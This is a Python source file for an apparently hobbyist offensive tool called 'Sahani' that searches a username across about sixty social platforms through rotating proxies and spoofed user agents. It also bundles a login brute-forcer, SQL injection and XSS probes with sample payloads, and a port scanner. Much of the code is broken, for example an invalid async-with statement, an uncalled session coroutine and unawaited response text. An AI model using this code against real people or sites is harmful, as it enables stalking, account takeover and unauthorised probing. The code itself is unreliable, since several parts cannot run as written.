import aiohttp
import asyncio
import argparse
import random
import csv
import json
import logging
from rich.console import Console
from rich.table import Table
from rich.progress import Progress
from fake_useragent import UserAgent
import requests
import time
from aiohttp import ClientSession, ClientTimeout
import sqlite3
from concurrent.futures import ThreadPoolExecutor
import IPProxyManager  # Use this for proxy management (You'll need to integrate this functionality)
import socket
from bs4 import BeautifulSoup

# Console UI
console = Console()

# ASCII Banner with "Sahani" in red
BANNER = """
███████╗ █████╗ ██╗  ██╗ █████╗ ███╗   ██╗██╗
██╔════╝██╔══██╗██║  ██║██╔══██╗████╗  ██║██║
███████╗███████║███████║███████║██╔██╗ ██║██║
╚════██║██╔══██║██╔══██║██╔══██║██║╚██╗██║██║
███████║██║  ██║██║  ██║██║  ██║██║ ╚████║██║
╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝
"""

# Modify "Sahani" in red
BANNER = BANNER.replace("Sahani", "[bold red]Sahani[/bold red]")

# Logging setup
LOG_FILE = "error_log.txt"
logging.basicConfig(filename=LOG_FILE, level=logging.ERROR, format="%(asctime)s - %(levelname)s - %(message)s")

# Load rotating User-Agents
ua = UserAgent()

# Username enumeration sites (Extend with more platforms)
SITES = {
    "GitHub": "https://github.com/{}",
    "Twitter": "https://twitter.com/{}",
    "Instagram": "https://www.instagram.com/{}",
    "LinkedIn": "https://www.linkedin.com/in/{}",
    "YouTube": "https://www.youtube.com/{}",
    "TikTok": "https://www.tiktok.com/@{}",
    "Reddit": "https://www.reddit.com/user/{}",
    "Pinterest": "https://www.pinterest.com/{}",
    "Snapchat": "https://www.snapchat.com/add/{}",
    "Facebook": "https://www.facebook.com/{}",
    "Medium": "https://medium.com/@{}",
    "Tumblr": "https://{}.tumblr.com",
    "VK": "https://vk.com/{}",
    "Steam": "https://steamcommunity.com/id/{}",
    "Discord": "https://discord.com/{}",
    "Twitch": "https://www.twitch.tv/{}",
    "WhatsApp": "https://api.whatsapp.com/send?phone={}",
    "Flickr": "https://www.flickr.com/people/{}",
    "SoundCloud": "https://soundcloud.com/{}",
    "DeviantArt": "https://www.deviantart.com/{}",
    "Redbubble": "https://www.redbubble.com/people/{}",
    "Behance": "https://www.behance.net/{}",
    "Dribbble": "https://dribbble.com/{}",
    "Patreon": "https://www.patreon.com/{}",
    "Stack Overflow": "https://stackoverflow.com/users/{}",
    "HackerRank": "https://www.hackerrank.com/{}",
    "Kaggle": "https://www.kaggle.com/{}",
    "Quora": "https://www.quora.com/profile/{}",
    "GitLab": "https://gitlab.com/{}",
    "Meetup": "https://www.meetup.com/members/{}",
    "Clubhouse": "https://www.joinclubhouse.com/@{}",
    "Couchsurfing": "https://www.couchsurfing.com/people/{}",
    "Etsy": "https://www.etsy.com/people/{}",
    "Mixcloud": "https://www.mixcloud.com/{}",
    "Gumroad": "https://{}.gumroad.com",
    "Wix": "https://{}.wixsite.com/",
    "LiveJournal": "https://{}.livejournal.com",
    "Badoo": "https://badoo.com/en/{}",
    "Fiverr": "https://www.fiverr.com/{}",
    "AngelList": "https://angel.co/{}",
    "Keybase": "https://keybase.io/{}",
    "Vimeo": "https://vimeo.com/{}",
    "WordPress": "https://{}.wordpress.com",
    "WeChat": "https://www.wechat.com/id/{}",
    "Signal": "https://www.signal.org/users/{}",
    "Line": "https://line.me/ti/p/{}",
    "About.me": "https://about.me/{}",
    "Xing": "https://www.xing.com/profile/{}",
    "Foursquare": "https://foursquare.com/{}",
    "Gravatar": "https://www.gravatar.com/{}",
    "Upwork": "https://www.upwork.com/fl/{}",
    "Trulia": "https://www.trulia.com/profile/{}",
    "Zillow": "https://www.zillow.com/profile/{}",
    "500px": "https://500px.com/{}",
    "Drip": "https://drip.com/{}",
    "Giphy": "https://giphy.com/{}",
    "Myspace": "https://myspace.com/{}",
    "Trello": "https://trello.com/{}",
    "Slack": "https://slack.com/team/{}",
    "KakaoTalk": "https://www.kakaocorp.com/service/KakaoTalk/{}"
}

    # Add more platforms here...

# Geolocation API setup (ipstack as an example)
IPSTACK_API_KEY = "your_ipstack_api_key"
IPSTACK_URL = "http://api.ipstack.com/{}?access_key=" + IPSTACK_API_KEY

# Proxy Manager Setup (using IPProxyManager or similar)
proxy_manager = IPProxyManager.ProxyManager()  # Custom class to handle rotating proxies

# Database Setup (SQLite)
DB_FILE = "results.db"

# Create a SQLite table if it doesn't exist
def create_db():
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS results (
            id INTEGER PRIMARY KEY,
            platform TEXT,
            username TEXT,
            profile_url TEXT,
            location TEXT
        )
    """)
    conn.commit()
    conn.close()

# Proxy Session Setup
async def get_session():
    """Setup aiohttp session with proxy rotation."""
    headers = {"User-Agent": ua.random}
    timeout = ClientTimeout(total=15, connect=10, sock_connect=10, sock_read=10)

    # Get a new proxy from the proxy manager
    proxy = proxy_manager.get_proxy()

    session = ClientSession(
        headers=headers,
        timeout=timeout,
        connector=aiohttp.TCPConnector(ssl=False)
    )
    return session, proxy

# Fetch location using IPStack API
def get_location(ip):
    """Get location details based on the IP."""
    try:
        response = requests.get(IPSTACK_URL.format(ip))
        data = response.json()
        if data.get("city") and data.get("country_name"):
            return f"{data['city']}, {data['country_name']}"
        else:
            return "Location not available"
    except Exception as e:
        logging.error(f"Error fetching location: {e}")
        return "Error fetching location"

# Check username with retries and error handling
async def check_username(session, username, site_name, url, proxy):
    """Check if username exists on a platform."""
    try:
        async with session.get(url.format(username), proxy=proxy) as response:
            if response.status == 200:
                ip = "sample_ip_for_location"  # Placeholder for actual IP extraction logic
                location = get_location(ip)
                return site_name, url.format(username), location
    except Exception as e:
        logging.error(f"Error checking {site_name}: {e}")
    return None

# Brute Force Attack
async def brute_force_login(session, url, username, password_list):
    """Perform a brute force attack on a login page."""
    for password in password_list:
        payload = {"username": username, "password": password}
        async with session.post(url, data=payload) as response:
            if "success" in response.text:
                return password
    return None

# SQL Injection Checker
async def sql_injection_check(session, url, payload):
    """Check for SQL injection vulnerabilities."""
    async with session.get(url + payload) as response:
        if "error" in response.text or "SQL" in response.text:
            return True
    return False

# XSS Detection
async def xss_detection(session, url, payload):
    """Check for XSS vulnerabilities."""
    async with session.get(url + payload) as response:
        soup = BeautifulSoup(response.text, 'html.parser')
        if payload in soup.get_text():
            return True
    return False

# Port Scanner
def port_scan(host, ports):
    """Scan open ports on a given host."""
    open_ports = []
    for port in ports:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(1)
            result = sock.connect_ex((host, port))
            if result == 0:
                open_ports.append(port)
    return open_ports

# Search username asynchronously with proxy support
async def search_username(username):
    """Search for the username asynchronously."""
    console.print(f"[bold cyan]{BANNER}[/bold cyan]")
    console.print(f"\n[bold yellow]🔍 Searching for username: {username}[/bold yellow]\n")

    results = []
    async with await get_session() as session, proxy:
        tasks = [check_username(session, username, site, url, proxy) for site, url in SITES.items()]
        with Progress() as progress:
            task = progress.add_task("[cyan]Scanning platforms...", total=len(tasks))
            for result in asyncio.as_completed(tasks):
                found = await result
                if found:
                    results.append(found)
                progress.update(task, advance=1)

    save_results(username, results)
    display_results(username, results)

# Save results in both JSON and CSV formats
def save_results(username, results):
    """Save results in JSON and CSV."""
    json_filename = f"{username}_results.json"
    csv_filename = f"{username}_results.csv"

    with open(json_filename, "w", encoding="utf-8") as file:
        json.dump([{ "Platform": site, "URL": url, "Location": location } for site, url, location in results], file, indent=4)

    with open(csv_filename, "w", newline="", encoding="utf-8") as file:
        writer = csv.writer(file)
        writer.writerow(["Platform", "Profile URL", "Location"])
        for site, url, location in results:
            writer.writerow([site, url, location])

# Display results in a console table
def display_results(username, results):
    """Display results in a table."""
    table = Table(title=f"🔍 Results for {username}")
    table.add_column("Platform", style="bold magenta")
    table.add_column("Profile URL", style="bold green")
    table.add_column("Location", style="bold yellow")
    for site, url, location in results:
        table.add_row(site, url, location)
    console.print(table)

# Retry mechanism for failed requests
async def retry_task(task, retries=3, delay=5):
    """Retry a task in case of failure."""  
    for attempt in range(retries):
        try:
            return await task
        except Exception as e:
            logging.error(f"Attempt {attempt+1} failed: {e}")
            if attempt < retries - 1:
                time.sleep(delay)
            else:
                logging.error("Max retries reached, skipping task.")
    return None

# Main entry point
def main():
    create_db()
    parser = argparse.ArgumentParser(description="Sahani - Ultimate Username Enumeration Tool")
    parser.add_argument("username", help="Username to search for")
    parser.add_argument("--brute-force", action="store_true", help="Enable brute force attack")
    parser.add_argument("--sql-injection", action="store_true", help="Enable SQL injection check")
    parser.add_argument("--xss", action="store_true", help="Enable XSS detection")
    parser.add_argument("--port-scan", action="store_true", help="Enable port scanning")
    args = parser.parse_args()

    if args.brute_force:
        # Example usage of brute force attack
        password_list = ["password1", "password2", "password3"]  # Replace with actual password list
        asyncio.run(brute_force_login(get_session(), "https://example.com/login", args.username, password_list))

    if args.sql_injection:
        # Example usage of SQL injection check
        payload = "' OR '1'='1"
        asyncio.run(sql_injection_check(get_session(), "https://example.com/search?q=", payload))

    if args.xss:
        # Example usage of XSS detection
        payload = "<script>alert('XSS')</script>"
        asyncio.run(xss_detection(get_session(), "https://example.com/search?q=", payload))

    if args.port_scan:
        # Example usage of port scanning
        open_ports = port_scan("example.com", [22, 80, 443, 8080])
        console.print(f"Open ports: {open_ports}")

    asyncio.run(search_username(args.username))

if __name__ == "__main__":
    main()
